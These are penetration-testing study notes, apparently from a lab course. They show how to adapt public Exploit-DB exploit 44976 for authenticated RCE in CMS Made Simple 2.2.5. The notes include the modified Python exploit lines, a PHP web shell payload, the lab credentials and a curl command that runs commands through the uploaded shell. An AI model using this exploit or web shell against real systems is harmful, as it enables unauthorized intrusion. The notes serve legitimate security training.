

Don't often result in memory corruption, therefore, they're not affected by DEP, ASLR, etc protections and exploits are significantly easier to re-purpose.  
  
However, public web app exploits don't take into account additional protections like htaccess, modsecurity, etc.  
  
Important to properly read code to understand what considerations must be taken in our editing process.  
Several key questions needed to ask while approaching the code:  
  
- Does it initiate an HTTP or HTTPS connection?  
- Does it access a web application specific path or route?  
- Does the exploit leverage a pre-authentication vulnerability?  
- If not, how does the exploit authenticate to the web application?  
- How are the GET or POST requests crafted to trigger and exploit the vulnerability?  
- Does it rely on default application settings (such as the web pathof the application) that may have been changed after installation?  
- Will oddities such as self-signed certificates disrupt the exploit?  
  
  
Ex:  
	During an assessment, we discover a Linux host w/ an _apache2_ server exposed.  
After enumerating the server, we find an install of _CMS Made Simple_ v2.2.5 listening on TCP port 443.  
```bash
dirb https://192.168.222.44
```

This version appears to be vuln to RCE & a public exploit is available on Exploit-DB (44976)  
  
The vuln's post-authentication, but we've discovered a valid app creds (admin/ HUYfaw763) on another machine during enum  
  
  
Looking at the code, things need to be updated:  
  
_Line 12_:  
```html
base_url = "http://192.168.1.10/cmsms/admin"
```
	Base URL variable needs to be changed to match the env  
	Same for the IP addr  
	Protocol needs to be set to HTTPS  
```html
base_url = "https://192.168.222.44/admin
```


Browsing to https://192.168.222.44/admin shows a Connection not Secure message:  
	_invalid security certificate_ (SEC_ERROR_UNKNOWN_ISSUER or ERROR_SELF_SIGNED_CERT)
![[self-signed.png]]

As the cert can't be validated, we must account for this in the exploit code.  
  
The exploit uses the _import requests_ library (_Line 9_) to comm w/ the target, making 3 POST requests.  
  
_Lines 34, 55, 80:_  
```python
response = requests.post(url, data=data, allow_redirects=False)  
...  
response = requests.post(url, data=data, files=txt, cookies=cookies)  
...  
response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
```


The official doc indicates that the SSL cert can be ignored if we set the _verify_ param to False: [https://docs.python-requests.org/en/latest/user/advanced/#ssl-cert-verification](https://docs.python-requests.org/en/latest/user/advanced/#ssl-cert-verification)  

```python
response = requests.post(url, data=data, allow_redirects=False, verify=False)  
...  
response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)  
...  
response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
```


Also need to change the creds to match those found.  
  
_Lines 15 & 16:_  
```python
username = "admin"  
password = "HUYfaw763"
```


Payload doesn't need to be changed as it only executes sys cmds passed in cleartext w/in GET:  
_Lines 20-21:_  
```python
php_filename = 'shell.php'  
payload = "<?php system($_GET['cmd']);?>"
```


Running the script throws an error:  
```bash
[+] Authenticated successfully with the supplied credentials  
Traceback (most recent call last):  
  File "web_EDB-44976.py", line 103, in <module>  
run()  
  File "web_EDB-44976.py", line 94, in run  
cookies,csrf_token = authenticate()  
  File "web_EDB-44976.py", line 38, in authenticate  
return response.cookies, parse_csrf_token(response.headers['Location'])  
  File "web_EDB-44976.py", line 24, in parse_csrf_token  
return location.split(csrf_param + "=")[1]  
IndexError: list index out of range  
```


Shows an exception was triggered during the execution of the _parse_csrf_token_ on _Line 24_ of the code.  
	Tells us the code tried to access a non-existent element of a Python list by accessing its 2nd element:  
_Lines 18, 23-24:_  
```python
csrf_param = "__c"  
...  
def parse_csrf_token(location):  
return location.split(csrf_param + "=")[1]
```


Looking at the code, you can see it uses the _split_ method to slice the string sotred in the _location_ parameter passed to the _parse_csrf_token_ func.  
  
Python doc for _split_ indicates that the method slices the input string using an optional delimiter passed as a first argument.  
The string slices returned by _split_ are then stored in a _List_ object that can be accessed via an index.  
Ex:  
```python
python  
  
>>> mystr = "Kali*-*Linux*-*Rocks"  
>>> result = mystr.split("*-*")  
>>> result  
['Kali', 'Linux', 'Rocks']  
>>> result[1]  
'Linux'
```

 
To help troubleshoot, we can insert a _print_ statement in the function before the return instructions:  
```python
def parse_csrf_token(location):  
print "[+] String being split: " + location  
return location.split(csrf_param + "=")[1]
```


Running the exploit again will print the full string before the _split_ method is invoked:  
```bash
[+] String being split: https://192.168.222.44/admin?_sk_=178967e0c571882184a  
```


As discovered, while the code expected the input string for _csrf_param_ to be “\_\__c_”, but instead received “\_\_sk\_\_”  
  
So fixing the parameter corrects the exploit:  
_Line 18:_  
```python
csrf_param = "_sk_"
```


Fix:  
```bash
[+] File copied successfully  
[+] Exploit succeeded, shell can be found at: https://192.168.222.44/uploads/shell.php  
```


Now we can validate the exploit by attaching to the php shell either in the browser or w/ [curl](curl.md):  
```bash
curl -k https://192.168.222.44/uploads/shell.php?cmd=whoami  
www-data
```